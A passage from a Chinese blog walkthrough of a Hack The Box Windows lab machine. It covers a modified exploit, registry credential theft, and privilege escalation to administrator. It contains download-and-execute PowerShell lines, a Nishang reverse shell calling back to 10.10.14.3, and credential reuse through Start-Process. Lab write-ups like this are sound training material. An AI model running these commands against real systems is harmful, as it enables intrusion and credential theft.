+<p>将重新生成的 shellcode 替换掉脚本当中的 shellcode，同时把 server_address 变量设置为目标IP和端口<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.40.31.png" alt="截屏2021-10-18 下午4.40.31"><br>在本地监听5555端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p>执行改编后的 python 脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 36025.py</span><br></pre></td></tr></table></figure>
+<p>成功反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.41.36.png" alt="截屏2021-10-18 下午4.41.36"><br>在当前用户桌面上寻找第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\Alfred\Desktop</span><br><span class="line"><span class="built_in">type</span> C:\Users\Alfred\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%885.02.47.png" alt="截屏2021-10-18 下午5.02.47"><br>成功获取第一个flag</p>
+<h2 id="0x03-上线-administrator"><a href="#0x03-上线-administrator" class="headerlink" title="0x03 上线[administrator]"></a>0x03 上线[administrator]</h2><h3 id="注册表获取凭证"><a href="#注册表获取凭证" class="headerlink" title="注册表获取凭证"></a>注册表获取凭证</h3><p>在注册表中发现用于自动登录的凭证密码：<code>Welcome1!</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> 2&gt;nul | findstr <span class="string">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.46.06.png" alt="截屏2021-10-18 下午4.46.06"><br>考虑到管理员可能会将该密码重用，我们需要使用该凭证登陆管理员账户</p>
+<h3 id="ssh反向连接"><a href="#ssh反向连接" class="headerlink" title="ssh反向连接"></a>ssh反向连接</h3><p>首先将端口转发工具 plink.exe 上传至靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/windows-resources/binaries/plink.exe .</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.49.30.png" alt="截屏2021-10-18 下午4.49.30"><br>在靶机上通过 powershell 命令接收 plink.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\Alfred</span><br><span class="line">powershell -c <span class="string">&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.3/plink.exe&#x27;, &#x27;plink.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.54.54.png" alt="截屏2021-10-18 下午4.54.54"></p>
+<p>在 kali 中开启 ssh 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br><span class="line">service ssh status</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.55.28.png" alt="截屏2021-10-18 下午4.55.28"></p>
+<p>在靶机上通过 plink.exe 完成ssh端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw root  -R 445:127.0.0.1:445 10.10.14.3</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.36.20.png" alt="截屏2021-10-18 下午11.36.20"><br>但是无法连接，那就采用 powershell 方式进行反向连接</p>
+<h3 id="powershell反弹"><a href="#powershell反弹" class="headerlink" title="powershell反弹"></a>powershell反弹</h3><p>使用 nishang 中的 Invoke-PowerShellTcp.ps1 脚本来进行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . </span><br></pre></td></tr></table></figure>
+<p>在脚本最后添加地址和端口进行反弹，同时在当前目录开启 http 服务</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Invoke-PowerShellTcp</span> <span class="string">-Reverse</span> <span class="string">-IPAddress</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.3</span> <span class="string">-Port</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p>在本地监听1234端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+<p>在靶机中执行命令加载powershell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.3/Invoke-PowerShellTcp.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.31.45.png" alt="截屏2021-10-19 上午12.31.45"><br>成功拿到反弹 powershell 命令</p>
+<h3 id="管理员上线"><a href="#管理员上线" class="headerlink" title="管理员上线"></a>管理员上线</h3><p>加载 PowerSploit 中的 PowerUp.ps1 脚本进行提权检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.3/PowerUp.ps1&#x27;</span>)</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.34.26.png" alt="截屏2021-10-19 上午12.34.26"><br>检测结果与之前的思路相同，将 administrator/Welcome1! 作为登陆凭证</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$password</span> <span class="string">=</span> <span class="string">ConvertTo-SecureString</span> <span class="string">&#x27;Welcome1!&#x27;</span> <span class="string">-AsPlainText</span> <span class="string">-Force</span></span><br><span class="line"><span class="string">$cred</span> <span class="string">=</span> <span class="string">New-Object</span> <span class="string">System.Management.Automation.PSCredential(&#x27;Administrator&#x27;,</span> <span class="string">$password)</span></span><br></pre></td></tr></table></figure>
+<p>将 nishang 的 Invoke-PowerShellTcp.ps1 复制为 shell.ps1，同时在最后写入反弹地址和端口</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Invoke-PowerShellTcp</span> <span class="string">-Reverse</span> <span class="string">-IPAddress</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.3</span> <span class="string">-Port</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+<p>在本地开启7777端口进行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
+<p>使用 python 开启http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>使用 powershell 下载 shell.ps1，之后执行该脚本将利用管理员凭证连接本地7777端口 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -FilePath <span class="string">&quot;powershell&quot;</span> -argumentlist <span class="string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27; http://10.10.14.3/shell.ps1&#x27; )&quot;</span> -Credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.56.43.png" alt="截屏2021-10-19 上午12.56.43"><br>成功拿到目标管理员权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.57.19.png" alt="截屏2021-10-19 上午12.57.19"><br>在管理员桌面寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.58.29.png" alt="截屏2021-10-19 上午12.58.29"><br>成功获取第二个flag</p>
+<h3 id="icalas读取root-txt"><a href="#icalas读取root-txt" class="headerlink" title="icalas读取root.txt"></a>icalas读取root.txt</h3><blockquote>
+<p>icacls是 Windows 应用程序，可以显示或修改指定文件上的自由访问控制列表（DACL），并将存储的 DACL 应用于指定目录中的文件，简单来说就是可以控制文件的权限。</p>
+</blockquote>
+<p>通过 icacls 查看管理员桌面，发现 alfred 用户实际存在权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\Users\Administrator\Desktop</span><br></pre></td></tr></table></figure>
+<p>但是对flag没有读取权限，但是我们可以通过 icacls 添加读取权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line">icacls root.txt /grant alfred:F</span><br><span class="line">icacls root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.30.33.png" alt="截屏2021-10-18 下午11.30.33"><br>成功获取到第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/a8d56bb4/">HTB: Conceal<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
